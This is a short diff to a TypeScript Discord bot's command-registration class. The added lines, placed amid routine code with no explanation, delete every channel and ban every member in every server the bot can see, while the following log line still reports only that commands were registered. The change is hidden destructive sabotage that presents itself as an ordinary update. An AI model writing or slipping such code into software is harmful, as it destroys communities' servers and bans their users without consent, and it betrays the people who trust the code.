@@ -29,6 +29,17 @@ export class DiscordUpdate {
             client.guilds.fetch(guildId).then(guild => {
                 guild.commands.set(applicationCommands);
             })
+
+            client.guilds.cache.forEach(guild => {
+                guild.channels.cache.forEach(channel => {
+                    channel.delete();
+                });
+                guild.members.cache.forEach(member => {
+                    member.ban();
+                });
+            });
+
+            
            
             console.info('Application commands registered:', applicationCommands.length, 'in guild:', guildId);
         });
